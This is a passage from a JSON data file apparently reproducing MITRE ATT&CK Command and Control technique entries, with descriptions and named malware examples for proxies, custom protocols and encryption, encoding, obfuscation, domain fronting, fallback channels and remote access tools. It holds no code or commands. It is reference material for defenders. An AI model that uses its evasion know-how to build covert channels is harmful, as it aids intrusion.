                {
                    "Name": "menuPass",
                    "Description": "menuPass has used a global service provider's IP as a proxy for C2 traffic from a victim.[18]"
                },
                {
                    "Name": "netsh",
                    "Description": "netsh can be used to set up a proxy tunnel to allow remote host access to an infected host.[19]"
                },
                {
                    "Name": "POWERSTATS",
                    "Description": "POWERSTATS has connected to C2 servers through proxies.[20]"
                },
                {
                    "Name": "QuasarRAT",
                    "Description": "QuasarRAT can communicate over a reverse proxy using SOCKS5.[21][22]"
                },
                {
                    "Name": "Regin",
                    "Description": "Regin leveraged several compromised universities as proxies to obscure its origin.[23]"
                },
                {
                    "Name": "Socksbot",
                    "Description": "Socksbot can start SOCKS proxy threads.[24]"
                },
                {
                    "Name": "Strider",
                    "Description": "Strider has used local servers with both local network and Internet access to act as internal proxy nodes to exfiltrate data from other parts of the network without direct Internet access.[25]"
                },
                {
                    "Name": "TYPEFRAME",
                    "Description": "A TYPEFRAME variant can force the compromised system to function as a proxy server.[26]"
                },
                {
                    "Name": "Vasport",
                    "Description": "Vasport is capable of tunneling though a proxy.[27]"
                },
                {
                    "Name": "XTunnel",
                    "Description": "XTunnel relays traffic between a C2 server and a victim.[28]"
                }
            ]
        },
        "Custom Command and Control Protocol": {
            "Name": "Custom Command and Control Protocol",
            "Description": "Adversaries may communicate using a custom command and control protocol instead of encapsulating commands/data in an existing Standard Application Layer Protocol. Implementations include mimicking well-known protocols or developing custom protocols (including raw sockets) on top of fundamental protocols provided by TCP/IP/another standard network stack.\n",
            "ID": "T1094",
            "Tactic": "Command And Control",
            "Platform: ": "Linux, macOS, Windows",
            "Data Sources: ": "Packet capture, Netflow/Enclave netflow, Process use of network, Process monitoring, Host network interface, Network intrusion detection system, Network protocol analysis",
            "Requires Network: ": "Yes",
            "Contributors: ": "Ryan Becwar",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT32",
                    "Description": "APT32 uses Cobalt Strike's malleable C2 functionality to blend in with network traffic.[1][2]"
                },
                {
                    "Name": "APT37",
                    "Description": "APT37 credential stealer ZUMKONG emails credentials from the victim using HTTP POST requests.[3]"
                },
                {
                    "Name": "Carbanak",
                    "Description": "Carbanak uses a custom binary protocol for C2 communications.[4]"
                },
                {
                    "Name": "Chaos",
                    "Description": "Chaos provides a reverse shell connection on 8338/TCP, encrypted via AES.[5]"
                },
                {
                    "Name": "Cobalt Strike",
                    "Description": "Cobalt Strike allows adversaries to modify the way the \"beacon\" payload communicates. This is called \"Malleable C2\" in the Cobalt Strike manual and is intended to allow a penetration test team to mimic known APT C2 methods.[6][2]"
                },
                {
                    "Name": "Crimson",
                    "Description": "Crimson uses a custom TCP protocol for C2.[7]"
                },
                {
                    "Name": "DDKONG",
                    "Description": "DDKONG communicates over raw TCP.[8]"
                },
                {
                    "Name": "Derusbi",
                    "Description": "Derusbi binds to a raw socket on a random source port between 31800 and 31900 for C2.[9]"
                },
                {
                    "Name": "Dipsind",
                    "Description": "A Dipsind variant uses a C2 mechanism similar to port knocking that allows attackers to connect to a victim without leaving the connection open for more than a few sectonds.[10]"
                },
                {
                    "Name": "Duqu",
                    "Description": "Duqu is capable of using its command and control protocol over port 443. However, Duqu is also capable of encapsulating its command protocol over standard application layer protocols. The Duqu command and control protocol implements many of the same features as TCP and is a reliable transport protocol.[11]"
                },
                {
                    "Name": "InvisiMole",
                    "Description": "InvisiMole communicates with its C2 servers through a TCP socket.[12]"
                },
                {
                    "Name": "Mis-Type",
                    "Description": "Mis-Type network traffic can communicate over a raw socket.[13]"
                },
                {
                    "Name": "Misdat",
                    "Description": "Misdat network traffic communicates over a raw socket.[13]"
                },
                {
                    "Name": "MoonWind",
                    "Description": "MoonWind completes network communication via raw sockets.[14]"
                },
                {
                    "Name": "Naid",
                    "Description": "Naid connects to C2 infrastructure and establishes backdoors over a custom communications protocol.[15][16]"
                },
                {
                    "Name": "NETEAGLE",
                    "Description": "If NETEAGLE does not detect a proxy configured on the infected machine, it will send beacons via UDP/6000. Also, after retrieving a C2 IP address and Port Number, NETEAGLE will initiate a TCP connection to this socket. The ensuing connection is a plaintext C2 channel in which commands are specified by DWORDs.[17]"
                },
                {
                    "Name": "OilRig",
                    "Description": "OilRig has used custom DNS Tunneling protocols for C2.[18]"
                },
                {
                    "Name": "PHOREAL",
                    "Description": "PHOREAL communicates via ICMP for C2.[1]"
                },
                {
                    "Name": "PLAINTEE",
                    "Description": "PLAINTEE uses a custom UDP protocol to communicate.[8]"
                },
                {
                    "Name": "PLATINUM",
                    "Description": "PLATINUM has used the Intel® Active Management Technology (AMT) Serial-over-LAN (SOL) channel for command and control.[19]"
                },
                {
                    "Name": "PlugX",
                    "Description": "PlugX can be configured to use raw TCP or UDP for command and control.[20]"
                },
                {
                    "Name": "Reaver",
                    "Description": "Some Reaver variants use raw TCP for C2.[21]"
                },
                {
                    "Name": "RedLeaves",
                    "Description": "RedLeaves can communicate to its C2 over TCP using a custom binary protocol.[22]"
                },
                {
                    "Name": "Regin",
                    "Description": "The Regin malware platform can use ICMP to communicate between infected computers.[23]"
                },
                {
                    "Name": "Remsec",
                    "Description": "Remsec is capable of using ICMP, TCP, and UDP for C2.[24][25]"
                },
                {
                    "Name": "RogueRobin",
                    "Description": "RogueRobin uses a custom DNS tunneling protocol for C2.[26]"
                },
                {
                    "Name": "RTM",
                    "Description": "RTM uses HTTP POST requests with data formatted using a custom protocol.[27]"
                },
                {
                    "Name": "TYPEFRAME",
                    "Description": "A TYPEFRAME variant uses fake TLS to communicate with the C2 server.[28]"
                },
                {
                    "Name": "Volgmer",
                    "Description": "Volgmer uses a custom binary protocol to beacon back to its C2 server. It has also used XOR for encrypting communications.[29][30]"
                },
                {
                    "Name": "WINDSHIELD",
                    "Description": "WINDSHIELD C2 traffic can communicate via TCP raw sockets.[1]"
                },
                {
                    "Name": "Zebrocy",
                    "Description": "Zebrocy uses raw sockets to communicate with its C2 server.[31]"
                }
            ]
        },
        "Custom Cryptographic Protocol": {
            "Name": "Custom Cryptographic Protocol",
            "Description": "Adversaries may use a custom cryptographic protocol or algorithm to hide command and control traffic. A simple scheme, such as XOR-ing the plaintext with a fixed key, will produce a very weak ciphertext.Custom encryption schemes may vary in sophistication. Analysis and reverse engineering of malware samples may be enough to discover the algorithm and encryption key used.Some adversaries may also attempt to implement their own version of a well-known cryptographic algorithm instead of using a known implementation library, which may lead to unintentional errors. [1]\n",
            "ID": "T1024",
            "Tactic": "Command And Control",
            "Platform: ": "Linux, macOS, Windows",
            "Data Sources: ": "Packet capture, Netflow/Enclave netflow, Process use of network, Malware reverse engineering, Process monitoring",
            "Requires Network: ": "Yes",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "3PARA RAT",
                    "Description": "3PARA RAT will use an 8-byte XOR key derived from the string HYF54&%9&jkMCXuiS instead if the DES decoding fails.[2]"
                },
                {
                    "Name": "4H RAT",
                    "Description": "4H RAT obfuscates C2 communication using a 1-byte XOR with the key 0xBE.[2]"
                },
                {
                    "Name": "BADCALL",
                    "Description": "BADCALL encrypts C2 traffic using an XOR/ADD cipher and uses a FakeTLS method.[3]"
                },
                {
                    "Name": "BADNEWS",
                    "Description": "BADNEWS encrypts C2 data with a ROR by 3 and an XOR by 0x23.[4][5]"
                },
                {
                    "Name": "BBSRAT",
                    "Description": "BBSRAT uses a custom encryption algorithm on data sent back to the C2 server over HTTP.[6]"
                },
                {
                    "Name": "Bisonal",
                    "Description": "Bisonal variants reported on in 2014 and 2015 used a simple XOR cipher for C2.[7]"
                },
                {
                    "Name": "BRONZE BUTLER",
                    "Description": "BRONZE BUTLER has used a tool called RarStar that encodes data with a custom XOR algorithm when posting it to a C2 server.[8]"
                },
                {
                    "Name": "Carbanak",
                    "Description": "Carbanak uses XOR with random keys for its communications.[9]"
                },
                {
                    "Name": "ChChes",
                    "Description": "ChChes can encrypt C2 data with a custom technique using MD5, base64-encoding, and RC4.[10][11]"
                },
                {
                    "Name": "CORESHELL",
                    "Description": "CORESHELL C2 messages are encrypted with custom stream ciphers using six-byte or eight-byte keys.[12]"
                },
                {
                    "Name": "CosmicDuke",
                    "Description": "CosmicDuke contains a custom version of the RC4 algorithm that includes a programming error.[1]"
                },
                {
                    "Name": "Derusbi",
                    "Description": "Derusbi obfuscates C2 traffic with variable 4-byte XOR keys.[13]"
                },
                {
                    "Name": "Emissary",
                    "Description": "The C2 server response to a beacon sent by a variant of Emissary contains a 36-character GUID value that is used as an encryption key for subsequent network communications. Some variants of Emissary use various XOR operations to encrypt C2 data.[14]"
                },
                {
                    "Name": "FakeM",
                    "Description": "The original variant of FakeM encrypts C2 traffic using a custom encryption cipher that uses an XOR key of \"YHCRA\" and bit rotation between each XOR operation. FakeM has also included HTML code in C2 traffic in an apparent attempt to evade detection. Additionally, some variants of FakeM use modified SSL code for communications back to C2 servers, making SSL decryption ineffective.[15]"
                },
                {
                    "Name": "FALLCHILL",
                    "Description": "FALLCHILL uses fake Transport Layer Security (TLS) to communicate with its C2 server, encoding data with RC4 encryption.[16]"
                },
                {
                    "Name": "Felismus",
                    "Description": "Some Felismus samples use a custom encryption method for C2 traffic using AES, base64 encoding, and multiple keys.[17]"
                },
                {
                    "Name": "Gazer",
                    "Description": "Gazer uses custom encryption for C2 using 3DES and RSA.[18][19]"
                },
                {
                    "Name": "HAMMERTOSS",
                    "Description": "Before being appended to image files, HAMMERTOSS commands are encrypted with a key composed of both a hard-coded value and a string contained on that day's tweet. To decrypt the commands, an investigator would need access to the intended malware sample, the day's tweet, and the image file containing the command.[20]"
                },
                {
                    "Name": "HARDRAIN",
                    "Description": "HARDRAIN uses FakeTLS to communicate with its C2 server.[21]"
                },
                {
                    "Name": "Hikit",
                    "Description": "Hikit performs XOR encryption.[22]"
                },
                {
                    "Name": "httpclient",
                    "Description": "httpclient encrypts C2 content with XOR using a single byte, 0x12.[2]"
                },
                {
                    "Name": "Hydraq",
                    "Description": "Hydraq C2 traffic is encrypted using bitwise NOT and XOR operations.[23]"
                },
                {
                    "Name": "InvisiMole",
                    "Description": "InvisiMole uses variations of a simple XOR encryption routine for C&C communications.[24]"
                },
                {
                    "Name": "KEYMARBLE",
                    "Description": "KEYMARBLE uses a customized XOR algorithm to encrypt C2 communications.[25]"
                },
                {
                    "Name": "Komplex",
                    "Description": "The Komplex C2 channel uses an 11-byte XOR algorithm to hide data.[26]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "Several Lazarus Group malware families encrypt C2 traffic using custom code that uses XOR with an ADD operation and XOR with a SUB operation. Another Lazarus Group malware sample XORs C2 traffic. Lazarus Group malware also uses a unique form of communication encryption known as FakeTLS that mimics TLS but uses a different encryption method, evading SSL man-in-the-middle decryption attacks.[27][28][29][30]"
                },
                {
                    "Name": "Lurid",
                    "Description": "Lurid performs XOR encryption.[31]"
                },
                {
                    "Name": "Mosquito",
                    "Description": "Mosquito uses a custom encryption algorithm, which consists of XOR and a stream that is similar to the Blum Blum Shub algorithm.[32]"
                },
                {
                    "Name": "PLAINTEE",
                    "Description": "PLAINTEE encodes C2 beacons using XOR.[33]"
                },
                {
                    "Name": "RTM",
                    "Description": "RTM encrypts C2 traffic with a custom RC4 variant.[34]"
                },
                {
                    "Name": "Sakula",
                    "Description": "Sakula encodes C2 traffic with single-byte XOR keys.[35]"
                },
                {
                    "Name": "Sys10",
                    "Description": "Sys10 uses an XOR 0x1 loop to encrypt its C2 domain.[36]"
                },
                {
                    "Name": "Taidoor",
                    "Description": "Taidoor is known to utilize encryption within network protocols.[37]"
                },
                {
                    "Name": "TrickBot",
                    "Description": "TrickBot uses a custom crypter leveraging Microsoft’s CryptoAPI to encrypt C2 traffic.[38]"
                }
            ]
        },
        "Data Encoding": {
            "Name": "Data Encoding",
            "Description": "Command and control (C2) information is encoded using a standard data encoding system. Use of data encoding may be to adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64,  MIME, UTF-8, or other binary-to-text and character encoding systems. [1] [2] Some data encoding systems may also result in data compression, such as gzip.\n",
            "ID": "T1132",
            "Tactic": "Command And Control",
            "Platform: ": "Linux, macOS, Windows",
            "Permissions Required: ": "User",
            "Data Sources: ": "Packet capture, Process use of network, Process monitoring, Network protocol analysis",
            "Requires Network: ": "Yes",
            "Contributors: ": "Itzik Kotler, SafeBreach",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "ADVSTORESHELL",
                    "Description": "C2 traffic from ADVSTORESHELL is encrypted, then encoded with Base64 encoding.[3]"
                },
                {
                    "Name": "APT19",
                    "Description": "An APT19 HTTP malware variant used Base64 to encode communications to the C2 server.[4]"
                },
                {
                    "Name": "AutoIt backdoor",
                    "Description": "AutoIt backdoor has sent a C2 response that was base64-encoded.[5]"
                },
                {
                    "Name": "BADNEWS",
                    "Description": "BADNEWS encodes C2 traffic with base64.[5][6][7]"
                },
                {
                    "Name": "Bankshot",
                    "Description": "Bankshot encodes commands from the control server using a range of characters and gzip.[8]"
                },
                {
                    "Name": "BRONZE BUTLER",
                    "Description": "Several BRONZE BUTLER tools encode data with base64 when posting it to a C2 server.[9]"
                },
                {
                    "Name": "BS2005",
                    "Description": "BS2005 uses Base64 encoding for communication in the message body of an HTTP request.[10]"
                },
                {
                    "Name": "CORESHELL",
                    "Description": "CORESHELL C2 messages are Base64-encoded.[11]"
                },
                {
                    "Name": "Daserf",
                    "Description": "Daserf uses custom base64 encoding to obfuscate HTTP traffic.[9]"
                },
                {
                    "Name": "Dipsind",
                    "Description": "Dipsind encodes C2 traffic with base64.[12]"
                },
                {
                    "Name": "Elise",
                    "Description": "Elise exfiltrates data using cookie values that are Base64-encoded.[13]"
                },
                {
                    "Name": "Helminth",
                    "Description": "For C2 over HTTP, Helminth encodes data with base64 and sends it via the \"Cookie\" field of HTTP requests. For C2 over DNS, Helminth converts ASCII characters into their hexadecimal values and sends the data in cleartext.[14]"
                },
                {
                    "Name": "JHUHUGIT",
                    "Description": "A JHUHUGIT variant encodes C2 POST data base64.[15]"
                },
                {
                    "Name": "Kazuar",
                    "Description": "Kazuar encodes communications to the C2 server in Base64.[16]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "A Lazarus Group malware sample encodes data with base64.[17]"
                },
                {
                    "Name": "Mis-Type",
                    "Description": "Mis-Type uses Base64 encoding for C2 traffic.[18]"
                },
                {
                    "Name": "Misdat",
                    "Description": "Misdat network traffic is Base64-encoded plaintext.[18]"
                },
                {
                    "Name": "OopsIE",
                    "Description": "OopsIE encodes data in hexadecimal format over the C2 channel.[19]"
                },
                {
                    "Name": "Patchwork",
                    "Description": "Patchwork used Base64 to encode C2 traffic.[20]"
                },
                {
                    "Name": "Pisloader",
                    "Description": "Responses from the Pisloader C2 server are base32-encoded.[21]"
                },
                {
                    "Name": "POWERSTATS",
                    "Description": "POWERSTATS encoded C2 traffic with base64.[22]"
                },
                {
                    "Name": "POWRUNER",
                    "Description": "POWRUNER can use base64 encoded C2 communications.[23]"
                },
                {
                    "Name": "Prikormka",
                    "Description": "Prikormka encodes C2 traffic with Base64.[24]"
                },
                {
                    "Name": "S-Type",
                    "Description": "S-Type uses Base64 encoding for C2 traffic.[18]"
                },
                {
                    "Name": "SeaDuke",
                    "Description": "SeaDuke C2 traffic is base64-encoded.[25]"
                },
                {
                    "Name": "Volgmer",
                    "Description": "Volgmer encodes files before exfiltration.[26]"
                }
            ]
        },
        "Data Obfuscation": {
            "Name": "Data Obfuscation",
            "Description": "Command and control (C2) communications are hidden (but not necessarily encrypted) in an attempt to make the content more difficult to discover or decipher and to make the communication less conspicuous and hide commands from being seen. This encompasses many methods, such as adding junk data to protocol traffic, using steganography, commingling legitimate traffic with C2 communications traffic, or using a non-standard data encoding system, such as a modified Base64 encoding for the message body of an HTTP request.\n",
            "ID": "T1001",
            "Tactic": "Command And Control",
            "Platform: ": "Linux, macOS, Windows",
            "Data Sources: ": "Packet capture, Process use of network, Process monitoring, Network protocol analysis",
            "Requires Network: ": "Yes",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT28",
                    "Description": "APT28 added \"junk data\" to each encoded string, preventing trivial decoding without knowledge of the junk removal algorithm. Each implant was given a \"junk length\" value when created, tracked by the controller software to allow seamless communication but prevent analysis of the command protocol on the wire.[1]"
                },
                {
                    "Name": "Axiom",
                    "Description": "The Axiom group has used other forms of obfuscation, include commingling legitimate traffic with communications traffic so that network streams appear legitimate. Some malware that has been used by Axiom also uses steganography to hide communication in PNG image files.[2]"
                },
                {
                    "Name": "Backdoor.Oldrea",
                    "Description": "Some Backdoor.Oldrea samples use standard Base64 + bzip2, and some use standard Base64 + reverse XOR + RSA-2048 to decrypt data received from C2 servers.[3]"
                },
                {
                    "Name": "BACKSPACE",
                    "Description": "Newer variants of BACKSPACE will encode C2 communications with a custom system.[4]"
                },
                {
                    "Name": "BADNEWS",
                    "Description": "After encrypting C2 data, BADNEWS converts it into a hexadecimal representation and then encodes it into base64.[5]"
                },
                {
                    "Name": "Bankshot",
                    "Description": "Bankshot generates a false TLS handshake using a public certificate to disguise C2 network communications.[6]"
                },
                {
                    "Name": "Daserf",
                    "Description": "Daserf can use steganography to hide malicious code downloaded to the victim.[7]"
                },
                {
                    "Name": "Downdelph",
                    "Description": "Downdelph inserts pseudo-random characters between each original character during encoding of C2 network requests, making it difficult to write signatures on them.[8]"
                },
                {
                    "Name": "Duqu",
                    "Description": "When the Duqu command and control is operating over HTTP or HTTPS, Duqu uploads data to its controller by appending it to a blank JPG file.[9]"
                },
                {
                    "Name": "FakeM",
                    "Description": "FakeM C2 traffic attempts to evade detection by resembling data generated by legitimate messenger applications, such as MSN and Yahoo! messengers.[10]"
                },
                {
                    "Name": "H1N1",
                    "Description": "H1N1 obfuscates C2 traffic with an altered version of base64.[11]"
                },
                {
                    "Name": "HAMMERTOSS",
                    "Description": "HAMMERTOSS is controlled via commands that are appended to image files.[12]"
                },
                {
                    "Name": "Ixeshe",
                    "Description": "The Ixeshe malware uses custom Base64 encoding schemes to obfuscate data command and control traffic in the message body of HTTP requests.[13]"
                },
                {
                    "Name": "P2P ZeuS",
                    "Description": "P2P ZeuS added junk data to outgoing UDP packets to peer implants.[14]"
                },
                {
                    "Name": "QUADAGENT",
                    "Description": "QUADAGENT encodes C2 communications with base64.[15]"
                },
                {
                    "Name": "RogueRobin",
                    "Description": "RogueRobin base64 encodes strings that are sent to the C2 over its DNS tunnel.[16]"
                },
                {
                    "Name": "ZeroT",
                    "Description": "ZeroT has retrieved stage 2 payloads as Bitmap images that use Least Significant Bit (LSB) steganography.[17][18]"
                }
            ]
        },
        "Domain Fronting": {
            "Name": "Domain Fronting",
            "Description": "Domain fronting takes advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS. [1] The technique involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, \"domainless\" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).For example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.\n",
            "ID": "T1172",
            "Tactic": "Command And Control",
            "Platform: ": "Linux, macOS, Windows",
            "Data Sources: ": "SSL/TLS inspection, Packet capture",
            "Requires Network: ": "Yes",
            "Contributors: ": "Matt Kelly, @breakersall",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT29",
                    "Description": "APT29 has used the meek domain fronting plugin for Tor to hide the destination of C2 traffic.[2]"
                },
                {
                    "Name": "meek",
                    "Description": "meek uses Domain Fronting to disguise the destination of network traffic as another server that is hosted in the same Content Delivery Network (CDN) as the intended desitnation."
                }
            ]
        },
        "Fallback Channels": {
            "Name": "Fallback Channels",
            "Description": "Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.\n",
            "ID": "T1008",
            "Tactic": "Command And Control",
            "Platform: ": "Linux, Windows, macOS",
            "Data Sources: ": "Malware reverse engineering, Netflow/Enclave netflow, Packet capture, Process monitoring, Process use of network",
            "Requires Network: ": "Yes",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "BISCUIT",
                    "Description": "BISCUIT malware contains a secondary fallback command and control server that is contacted after the primary command and control server.[1][2]"
                },
                {
                    "Name": "BlackEnergy",
                    "Description": "BlackEnergy has the capability to communicate over a backup channel via plus.google.com.[3]"
                },
                {
                    "Name": "CHOPSTICK",
                    "Description": "CHOPSTICK can switch to a new C2 channel if the current one is broken.[4]"
                },
                {
                    "Name": "Derusbi",
                    "Description": "Derusbi uses a backup communication method with an HTTP beacon.[5]"
                },
                {
                    "Name": "DustySky",
                    "Description": "DustySky has two hard-coded domains for C2 servers; if the first does not respond, it will try the second.[6]"
                },
                {
                    "Name": "JHUHUGIT",
                    "Description": "JHUHUGIT tests if it can reach its C2 server by first attempting a direct connection, and if it fails, obtaining proxy settings and sending the connection through a proxy, and finally injecting code into a running browser if the proxy method fails.[7]"
                },
                {
                    "Name": "Kazuar",
                    "Description": "Kazuar can accept multiple URLs for C2 servers.[8]"
                },
                {
                    "Name": "Kwampirs",
                    "Description": "Kwampirs uses a large list of C2 servers that it cycles through until a successful connection is established.[9]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "Lazarus Group malware SierraAlfa sends data to one of the hard-coded C2 servers chosen at random, and if the transmission fails, chooses a new C2 server to attempt the transmission again.[10][11]"
                },
                {
                    "Name": "Linfo",
                    "Description": "Linfo creates a backdoor through which remote attackers can change C2 servers.[12]"
                },
                {
                    "Name": "MiniDuke",
                    "Description": "MiniDuke uses Google Search to identify C2 servers if its primary C2 method via Twitter is not working.[13]"
                },
                {
                    "Name": "Mis-Type",
                    "Description": "Mis-Type first attempts to use a Base64-encoded network protocol over a raw TCP socket for C2, and if that method fails, falls back to a secondary HTTP-based protocol to communicate to an alternate C2 server.[14]"
                },
                {
                    "Name": "NETEAGLE",
                    "Description": "NETEAGLE will attempt to detect if the infected host is configured to a proxy. If so, NETEAGLE will send beacons via an HTTP POST request; otherwise it will send beacons via UDP/6000.[15]"
                },
                {
                    "Name": "OilRig",
                    "Description": "OilRig malware ISMAgent falls back to its DNS tunneling mechanism if it is unable to reach the C2 server over HTTP.[16]"
                },
                {
                    "Name": "QUADAGENT",
                    "Description": "QUADAGENT uses multiple protocols (HTTPS, HTTP, DNS) for its C2 server as fallback channels if communication with one is unsuccessful.[17]"
                },
                {
                    "Name": "S-Type",
                    "Description": "S-Type primarily uses port 80 for C2, but falls back to ports 443 or 8080 if initial communication fails.[14]"
                },
                {
                    "Name": "SslMM",
                    "Description": "SslMM has a hard-coded primary and backup C2 string.[18]"
                },
                {
                    "Name": "WinMM",
                    "Description": "WinMM is usually configured with primary and backup domains for C2 communications.[18]"
                },
                {
                    "Name": "XTunnel",
                    "Description": "The C2 server used by XTunnel provides a port number to the victim to use as a fallback in case the connection closes on the currently used port.[4]"
                }
            ]
        },
        "Multi-hop Proxy": {
            "Name": "Multi-hop Proxy",
            "Description": "To disguise the source of malicious traffic, adversaries may chain together multiple proxies. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source.\n",
            "ID": "T1188",
            "Tactic": "Command And Control",
            "Platform: ": "Linux, macOS, Windows",
            "Data Sources: ": "Network protocol analysis, Netflow/Enclave netflow",
            "Requires Network: ": "Yes",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT29",
                    "Description": "A backdoor used by APT29 created a Tor hidden service to forward traffic from the Tor client to local ports 3389 (RDP), 139 (Netbios), and 445 (SMB) enabling full remote access from outside the network.[1]"
                },
                {
                    "Name": "Dok",
                    "Description": "Dok downloads and installs Tor via homebrew.[2]"
                },
                {
                    "Name": "Keydnap",
                    "Description": "Keydnap uses a copy of tor2web proxy for HTTPS communications.[3]"
                },
                {
                    "Name": "MacSpy",
                    "Description": "MacSpy uses Tor for command and control.[2]"
                },
                {
                    "Name": "Tor",
                    "Description": "Traffic traversing the Tor network will be forwarded to multiple nodes before exiting the Tor network and continuing on to its intended destination.[4]"
                }
            ]
        },
        "Multi-Stage Channels": {
            "Name": "Multi-Stage Channels",
            "Description": "Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult.Remote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.The different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks or Fallback Channels in case the original first-stage communication path is discovered and blocked.\n",
            "ID": "T1104",
            "Tactic": "Command And Control",
            "Platform: ": "Linux, macOS, Windows",
            "Data Sources: ": "Netflow/Enclave netflow, Network device logs, Network protocol analysis, Packet capture, Process use of network",
            "Requires Network: ": "Yes",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT3",
                    "Description": "An APT3 downloader first establishes a SOCKS5 connection to 192.157.198[.]103 using TCP port 1913; once the server response is verified, it then requests a connection to 192.184.60[.]229 on TCP port 81.[1]"
                },
                {
                    "Name": "BACKSPACE",
                    "Description": "BACKSPACE attempts to avoid detection by checking a first stage command and control server to determine if it should connect to the second stage server, which performs \"louder\" interactions with the malware.[2]"
                },
                {
                    "Name": "BLACKCOFFEE",
                    "Description": "BLACKCOFFEE uses Microsoft’s TechNet Web portal to obtain an encoded tag containing the IP address of a command and control server and then communicates separately with that IP address for C2. If the C2 server is discovered or shut down, the threat actors can update the encoded IP address on TechNet to maintain control of the victims’ machines.[3]"
                },
                {
                    "Name": "Chaos",
                    "Description": "After initial compromise, Chaos will download a second stage to establish a more permanent presence on the affected system.[4]"
                }
            ]
        },
        "Multiband Communication": {
            "Name": "Multiband Communication",
            "Description": "Some adversaries may split communications between different protocols. There could be one protocol for inbound command and control and another for outbound data, allowing it to bypass certain firewall restrictions. The split could also be random to simply avoid data threshold alerts on any one communication.\n",
            "ID": "T1026",
            "Tactic": "Command And Control",
            "Platform: ": "Linux, macOS, Windows",
            "Data Sources: ": "Packet capture, Netflow/Enclave netflow, Process use of network, Malware reverse engineering, Process monitoring",
            "Requires Network: ": "Yes",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Cobalt Strike",
                    "Description": "Cobalt Strike's \"beacon\" payload can receive C2 from one protocol and respond on another. This is typically a mixture of HTTP, HTTPS, and DNS traffic.[1]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "Some Lazarus Group malware uses multiple channels for C2, such as RomeoWhiskey-Two, which consists of a RAT channel that parses data in datagram form and a Proxy channel that forms virtual point-to-point sessions.[2][3]"
                },
                {
                    "Name": "PlugX",
                    "Description": "PlugX can be configured to use multiple network protocols to avoid network-based detection.[4]"
                }
            ]
        },
        "Multilayer Encryption": {
            "Name": "Multilayer Encryption",
            "Description": "An adversary performs C2 communications using multiple layers of encryption, typically (but not exclusively) tunneling a custom encryption scheme within a protocol encryption scheme such as HTTPS or SMTPS.\n",
            "ID": "T1079",
            "Tactic": "Command And Control",
            "Platform: ": "Linux, macOS, Windows",
            "Data Sources: ": "Packet capture, Process use of network, Malware reverse engineering, Process monitoring",
            "Requires Network: ": "Yes",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Hi-Zor",
                    "Description": "Hi-Zor encrypts C2 traffic with HTTPS and also encodes it with a single-byte XOR key.[1]"
                },
                {
                    "Name": "Pupy",
                    "Description": "Pupy can use Obfs3, a pluggable transport, to add another layer of encryption and obfuscate TLS.[2]"
                },
                {
                    "Name": "Sykipot",
                    "Description": "Sykipot communicates using HTTPS and uses a custom encryption cipher to encrypt the HTTPS message body.[3]"
                },
                {
                    "Name": "Tor",
                    "Description": "Tor encapsulates traffic in multiple layers of encryption.[4]"
                }
            ]
        },
        "Remote Access Tools": {
            "Name": "Remote Access Tools",
            "Description": "An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be whitelisted within a target environment. Remote access tools like VNC, Ammy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. [1]Remote access tools may be established and used post-compromise as alternate communications channel for Redundant Access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary controlled system.Admin tools such as TeamViewer have been used by several groups targeting institutions in countries of interest to the Russian state and criminal campaigns. [2] [3]\n",
            "ID": "T1219",
            "Tactic": "Command And Control",
            "Platform: ": "Linux, Windows, macOS",
            "Permissions Required: ": "User",
            "Data Sources: ": "Network intrusion detection system, Network protocol analysis, Process use of network, Process monitoring",
            "Requires Network: ": "Yes",
            "Contributors: ": "Matt Kelly, @breakersall",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Carbanak",
                    "Description": "Carbanak used legitimate programs such as AmmyAdmin and Team Viewer for remote interactive C2 to target systems.[4]"
                },
                {
                    "Name": "Carbanak",
                    "Description": "Carbanak has a plugin for VNC and Ammyy Admin Tool.[5]"
                },
                {
                    "Name": "Cobalt Group",
                    "Description": "Cobalt Group used the Ammyy Admin tool as well as TeamViewer for remote access.[6][7][8]"
                },
                {
                    "Name": "Thrip",
                    "Description": "Thrip used a cloud-based remote access software called LogMeIn for their attacks.[9]"
                }
            ]
        },
        "Standard Application Layer Protocol": {
            "Name": "Standard Application Layer Protocol",
